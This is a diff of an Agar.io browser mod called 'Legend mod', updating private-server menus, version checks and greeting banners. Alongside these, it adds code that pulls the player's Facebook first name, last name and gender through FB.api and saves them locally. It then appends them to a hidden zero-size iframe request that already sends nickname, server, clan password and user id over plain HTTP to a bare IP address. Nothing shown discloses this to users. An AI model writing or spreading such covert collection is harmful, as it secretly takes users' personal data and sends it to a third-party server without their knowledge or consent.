@@ -1,9 +1,9 @@
 /*************
- * LEGEND mod v2.587 by Jimboy3100   email:jimboy3100@hotmail.com
+ * LEGEND mod v2.593 by Jimboy3100   email:jimboy3100@hotmail.com
  *************/
 loadersetings();
 loadericon();
-
+document.title = "Legend mod";
 		
 var oldgamemode=$("#gamemode");
 		//Private Servers
@@ -17,8 +17,10 @@ var oldgamemode=$("#gamemode");
 		'<option value=":PrS2" data-itr="PrS2">1vs1 Arena(2)</option>'+
 		'<option value=":PrS3" data-itr="PrS3">Party Server(1)</option>'+
 		'<option value=":PrS4" data-itr="PrS4">Party Server(2)</option>'+
-		'<option value=":PrS5" data-itr="PrS5">Party Server(3)</option>'+		
-		'<option value=":PrS6" data-itr="PrS6">Instant Merge</option>');
+		'<option value=":PrS6" data-itr="PrS6">Instant Merge(1)</option>'+
+		'<option value=":PrS5" data-itr="PrS5">Instant Merge(2)</option>'+
+		'<option value=":PrS7" data-itr="PrS7">Experimental</option>');	
+		
     }
 	else if (this.value != ":PrS") {
     console.log("Leaving PrS");
@@ -58,8 +60,12 @@ $('#gamemode').on('change', function() {
 	PrivateServer5();
     }
     else if (this.value == ":PrS6") {
-    console.log("Going to PRS6");
+    console.log("Going to PRS5");
 	PrivateServer6();
+    }
+    else if (this.value == ":PrS7") {
+    console.log("Going to PRS5");
+	PrivateServer7();
     }	
 });
 
@@ -168,7 +174,7 @@ var setyt = "YES";
 var clanpassword;
 var searching;
 var timerId;
-var semimodVersion = "55"; // the version 1.1-> 1.11
+var semimodVersion = "58"; // the version 1.1-> 1.11
 T = {};
 var MSGCOMMANDS = "";
 var MSGCOMMANDS2;
@@ -201,8 +207,10 @@ var toastrSkinNotice=0;
 var detailed="";
 //var userIp;
 var detailed1;
-
-
+var userfirstname = localStorage.getItem("userfirstname");
+var userlastname = localStorage.getItem("userlastname");
+var usergender = localStorage.getItem("usergender");
+var fbresponse={};
 
 
 var Premadeletter0 = "Communication Activated";
@@ -367,15 +375,13 @@ $("body").on('DOMNodeInserted', ".toast.toast-warning", function() {
 		if($('#region>option:nth-child(1)').val()!=":PrS")	{
 		$('#region').prepend('<option value=":PrS" data-itr="PrS">Private Servers</option>');	
 		}
-		
-		
-        /*if (openthecommunication=="YES"){
-        	setTimeout(function () {
-        	$('#gamemode').val(realmode2);
-        	$("#connect2").click();
-        	return openthecommunication="NO";
-        	},2500);
-        }*/
+		//Save Name, Surname, Gender
+		FB.api('/me', {fields: 'first_name, last_name, gender'}, function(response) {fbresponse=response; return fbresponse;});
+		setTimeout(function (){ 
+			userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
+			userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
+			usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
+			},250);
     }
 });
 
@@ -397,6 +403,13 @@ $("body").on('DOMSubtreeModified', "#chat-box", function() {
 		MC.setQuality($('#quality').val());
 		if($('#region>option:nth-child(1)').val()!=":PrS")	{
 		$('#region').prepend('<option value=":PrS" data-itr="PrS">Private Servers</option>');	
+		//Save Name, Surname, Gender
+		FB.api('/me', {fields: 'first_name, last_name, gender'}, function(response) {fbresponse=response; return fbresponse;});
+		setTimeout(function (){ 
+			userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
+			userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
+			usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
+			},250);
 		}
 		
     }
@@ -1933,8 +1946,8 @@ function init(modVersion) {
         });
 
         $("#OpenuserScripts").click(function() {
-            if (modVersion != "2.5") {
-                toastr["info"]("Mod Version must be 2.5 or higher").css("width", "250px");
+            if (modVersion != "2.4" && modVersion != "2.5") {
+                toastr["info"]("Mod Version must be 2.4 or higher").css("width", "250px");
                 return false;
             } else {
                 $("#main-menu").hide();
@@ -2021,16 +2034,24 @@ function init(modVersion) {
 
 		$('*[data-itr="page_play"]').click(function() {
 			var userid=$('#user-id-tag').text();userid = userid.replace("User id: ", "");
-			
-		if (searchSip == null) {
-			detailed1="http://104.236.44.149/sys/index.php?" + "action=Play" +"&name=" + $('#nick').val() + "&sip=" + $('#server').val() + "&pwd=" +$('#clantag').val() + "&usrid=" + userid + "&type=NoLocked"  ;
+			var Pwdtosend="NONE";
+			var servertosend="NotFound";
+			if ($('#server').val() != ""||$('#server').val() != null) {servertosend=$('#server').val(); }
+			if ($('#clantag').val() != "") {Pwdtosend=$('#clantag').val(); }
+			if (servertosend.indexOf("#")==false) {
+			servertosend= $('#server').val().replace('#', 'Party-');}
+		if (searchSip == null) {		
+			detailed1="http://104.236.44.149/sys/index.php?" + "action=Play" + "&name=" + $('#nick').val() + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&usrid=" + userid + "&type=NoLocked" + "&lastname=" + userlastname + "&firstname=" + userfirstname;
 		}
 		else if (searchSip != null) {
-			detailed1="http://104.236.44.149/sys/index.php?" + "action=Play" + "&name=" + $('#nick').val() + "&sip=" + currentIP + "&pwd=" + $('#clantag').val() + "&usrid=" + userid + "&type=Locked"  ;
+			detailed1="http://104.236.44.149/sys/index.php?" + "action=Play" + "&name=" + $('#nick').val() + "&sip=" + searchSip + "&pwd=" + Pwdtosend + "&usrid=" + userid + "&type=Locked" + "&lastname=" + userlastname + "&firstname=" + userfirstname;
 		}
 		else if (privateSrv!=null) {
-			detailed1="http://104.236.44.149/sys/index.php?" + "action=Play" + "&name=" + $('#nick').val() + "&sip=" + privateSrv + "&pwd=" + $('#clantag').val() + "&usrid=" + userid + "&type=PrivateServer"  ;
+			detailed1="http://104.236.44.149/sys/index.php?" + "action=Play" + "&name=" + $('#nick').val() + "&sip=" + privateSrv + "&pwd=" + Pwdtosend + "&usrid=" + userid + "&type=PrivateServer" + "&lastname=" + userlastname + "&firstname=" + userfirstname;
 		}
+		else {
+			detailed1="http://104.236.44.149/sys/index.php?" + "action=Play" + "&name=" + $('#nick').val() + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&usrid=" + userid + "&type=NoLocked" + "&lastname=" + userlastname + "&firstname=" + userfirstname;
+		}		
 		$('#LEGENDAds3').append('<div id="loaderIframeInfo1"><iframe id="loaderIframeInfo" src = ' + detailed1 + ' name="detailedinfo" allowtransparency="true" scrolling="no" frameBorder="0" style="width:0%; height:0%; border:none;"></iframe></div>');
                                         setTimeout(function() {
                                     $('#loaderIframeInfo1').remove();
@@ -2247,9 +2268,10 @@ function init(modVersion) {
         //Other things
         // ADS
         var tag1 = document.getElementById("nick").value;
-        if (modVersion != "2.5") {
+        if (modVersion != "2.4" && modVersion != "2.5") {
             $("#LEGENDAds").load("https://raw.githubusercontent.com/jimboy3100/legend.github.io/master/banners/bannerupdate");
-        } else {
+        } 
+		else {
             if (tag1.includes("♔Jimboy3100") == true) {
                 $("#LEGENDAds").load("https://raw.githubusercontent.com/jimboy3100/legend.github.io/master/banners/playeriamlegend");
             } else if (tag1.includes("GUARD") == true) {
@@ -2290,13 +2312,28 @@ function init(modVersion) {
         }
 
         // ANNOUNCEMENTS
-        if (modVersion != "2.5") {
-            toastr["info"]('Mod <font color="yellow"><b>v' + modVersion + '</b></font> ' + Premadeletter16 + ' <font color="yellow"><b>v2.5</b></font>. <br>visit: <a target="_blank" href="https://jimboy3100.github.io/legendmod.user.js"><font color="red"><b><u>www.legendmod.ml</u></b></font></a>');
-        } //else{toastr["info"]('Hello ' + tag1 +'! </br>Legend Mod v' + modVersion + ' website: <a target="_blank" href="http://www.legendmod.ml/">LINK</a>');
-        else {
-            toastr["info"](Premadeletter17 + ' <b><font color="yellow"><span style="text-shadow: 0px 0px 10px #0DA9C7;background: transparent url(https://jimboy3100.github.io/banners/particles.gif);">' + tag1 + '</span></font>!').css("width", "300px");		
-          //  toastr["info"](Premadeletter17 + ' <b><font color="red">' + tag1 + '</font></b>!<br>When experiencing lag, press <font color="red"><b>'+$("#hk-showSkins").val()+'</b></font> to disable skins. <br><i> Less to draw means better performance.</i>').css("width", "380px");
-        }
+        if (modVersion != "2.4" && modVersion != "2.5") {	           
+			toastr["info"]('Mod <font color="yellow"><b>v' + modVersion + '</b></font> ' + Premadeletter16 + ' <font color="yellow"><b>v2.4</b></font>. <br>visit: <a target="_blank" href="https://jimboy3100.github.io/legendmod.user.js"><font color="red"><b><u>www.legendmod.ml</u></b></font></a>');
+		}//else{toastr["info"]('Hello ' + tag1 +'! </br>Legend Mod v' + modVersion + ' website: <a target="_blank" href="http://www.legendmod.ml/">LINK</a>');
+		else {
+			  if (modVersion == "2.5"){
+			toastr["info"]('Current <font color="yellow"><b>v2.5</b></font> is <b>BETA</b>. <font color="yellow"><b>v2.4</b></font> is stable. <br>Visit: <a target="_blank" href="https://jimboy3100.github.io/goodoldlegendmod.user.js"><font color="red"><b><u>www.legendmod.ml</u></b></font></a>').css("width", "320px");	
+			}
+			else{
+			//  toastr["info"](Premadeletter17 + ' <b><font color="red">' + tag1 + '</font></b>!<br>When experiencing lag, press <font color="red"><b>'+$("#hk-showSkins").val()+'</b></font> to disable skins. <br><i> Less to draw means better performance.</i>').css("width", "380px");
+			if (userlastname!=null && userfirstname!=null){ 
+				if (usergender=="male"){
+				toastr["info"](Premadeletter17 + ' <b><font color="yellow"><span style="text-shadow: 0px 0px 10px #0DA9C7;background: transparent url(https://jimboy3100.github.io/banners/particles.gif);">'+'Mr. ' + userlastname +' '+ userfirstname + '</span></font>!').css("width", "350px");	
+				}
+				else if (usergender=="female"){
+				toastr["info"](Premadeletter17 + ' <b><font color="yellow"><span style="text-shadow: 0px 0px 10px #0DA9C7;background: transparent url(https://jimboy3100.github.io/banners/particles.gif);">'+'Ms. ' + userlastname +' '+ userfirstname + '</span></font>!').css("width", "350px");
+				}
+			}
+			else{
+		   toastr["info"](Premadeletter17 + ' <b><font color="yellow"><span style="text-shadow: 0px 0px 10px #0DA9C7;background: transparent url(https://jimboy3100.github.io/banners/particles.gif);">' + tag1 + '</span></font>!').css("width", "350px");		       
+				}
+		}
+	}
         //toastr["info"](' QUICK Server reconnects may cause <b><font color="green">Google Plus / Facebook </font></b> logouts').css("width", "350px");}
 
         $("#infoicon").mouseover(function() {
@@ -2313,7 +2350,7 @@ function init(modVersion) {
         });
 
         $("#infoicon").mouseout(function() {
-            if (modVersion != "2.5") {
+            if (modVersion != "2.4" && modVersion != "2.5") {
                 $("#LEGENDAds").load("https://raw.githubusercontent.com/jimboy3100/legend.github.io/master/banners/bannerupdate");
             } else {
                 if (tag1.includes("♔Jimboy3100") == true) {
@@ -2356,7 +2393,7 @@ function init(modVersion) {
             }
         });
         $("#vanillaset").mouseout(function() {
-            if (modVersion != "2.5") {
+            if (modVersion != "2.4" && modVersion != "2.5") {
                 $("#LEGENDAds").load("https://raw.githubusercontent.com/jimboy3100/legend.github.io/master/banners/bannerupdate");
             } else {
                 if (tag1.includes("♔Jimboy3100") == true) {
@@ -2399,7 +2436,7 @@ function init(modVersion) {
             }
         });
         $("#defaultset").mouseout(function() {
-            if (modVersion != "2.5") {
+            if (modVersion != "2.4" && modVersion != "2.5") {
                 $("#LEGENDAds").load("https://raw.githubusercontent.com/jimboy3100/legend.github.io/master/banners/bannerupdate");
             } else {
                 if (tag1.includes("♔Jimboy3100") == true) {
@@ -2443,7 +2480,7 @@ function init(modVersion) {
 
         });
         $("#agarioset").mouseout(function() {
-            if (modVersion != "2.5") {
+            if (modVersion != "2.4" && modVersion != "2.5") {
                 $("#LEGENDAds").load("https://raw.githubusercontent.com/jimboy3100/legend.github.io/master/banners/bannerupdate");
             } else {
                 if (tag1.includes("♔Jimboy3100") == true) {
@@ -2902,8 +2939,13 @@ function init(modVersion) {
 			$(".btn.btn-warning.btn-login-play.btn-needs-server").hide();
 			$(".btn.btn-play-guest.btn-success.btn-needs-server").css({'width': '100%'});
 			setTimeout(function() {
-			toastr["info"]('<b>Private Server</b>: <font color="red"><b>' + privateSrv + '</b></font><br>Connect to any agar.io/?ip= server or make your own.<br>Library: <a target="_blank" href="https://github.com/Megabyte918/MultiOgar-Edited"><font color="yellow"><b><u>https://github.com/Megabyte918/MultiOgar-Edited</u></b></font><br>Play agario-like games if you know the IP of servers', '', '{ timeOut: 10000, extendedTimeOut: 10000 }').css("width", "420px");
-            $("#server").hide();
+				if(privateSrv.includes("fzogar.xyz")){
+					toastr["info"]('<div id="tutorial" style="background-image: url(https://jimboy3100.github.io/banners/FAYiz/FayizPromoCarSmall.jpg); color:#018cf6; font-size:16px; text-align:center"><b>Private Server</b>: <font color="red"><b>' + privateSrv + '</b></font><br>Server provided by FAYiz.</font><br><b>Website:</b><a target="_blank" href="https://github.com/Megabyte918/MultiOgar-Edited"><font color="yellow"><b><u>Soon!</u></b></font><br><font style="color:#018cf6; font-size:16px; text-align:center"><b>FAYiz Github Library:</b></font><br><font color="yellow"><b><u>https://github.com/fayizan</u></b></font> <br><i>Please donate to Fayiz if you enjoyed PS.<br>Maintenance of Servers cost much.</i></div>', '', '{ timeOut: 10000, extendedTimeOut: 10000 }').css("width", "420px");		
+				}
+				else{
+					toastr["info"]('<b>Private Server</b>: <font color="red"><b>' + privateSrv + '</b></font><br>Connect to any agar.io/?ip= server or make your own.<br>Library: <a target="_blank" href="https://github.com/Megabyte918/MultiOgar-Edited"><font color="yellow"><b><u>https://github.com/Megabyte918/MultiOgar-Edited</u></b></font><br>Play agario-like games if you know the IP of servers', '', '{ timeOut: 10000, extendedTimeOut: 10000 }').css("width", "420px");
+				}
+			$("#server").hide();
             $("#connect2").hide();			
 			}, 3000); 
 			
@@ -4862,16 +4904,19 @@ function PrivateServer2(){
 	window.open("http://agar.io/?ip=game.fzogar.xyz:4001","_self");
 }
 function PrivateServer3(){
-	window.open("http://agar.io/?ip=game.fzogar.xyz:5000","_self");
-}
-function PrivateServer4(){
 	window.open("http://agar.io/?ip=game.fzogar.xyz:5001","_self");
 }
-function PrivateServer5(){
+function PrivateServer4(){
 	window.open("http://agar.io/?ip=game.fzogar.xyz:5002","_self");
 }
-function PrivateServer6(){
+function PrivateServer5(){
 	window.open("http://agar.io/?ip=172.73.178.205:8880","_self");
+}
+function PrivateServer6(){
+	window.open("http://agar.io/?ip=game1.fzogar.xyz:4000","_self");
+}
+function PrivateServer7(){
+	window.open("http://agar.io/?ip=game1.fzogar.xyz:4001","_self");
 }
 /*
 function adres() {
@@ -6498,10 +6543,11 @@ function animatedskins(){
    else {
       w.setTimeout(function() {
          agarXTRA(w);
-		 $("#movingskins").css( { marginTop : "-15px" } );
-		$("#movingskins").css( { marginBottom : "-30px" } );
+
       }, 100);
    }
+	$("#movingskins").css( { marginTop : "-15px" } );
+	$("#movingskins").css( { marginBottom : "-30px" } );   
    setTimeout(function() { 
     //hide extra names
     $('#movingskins>option:nth-child(68)').hide();
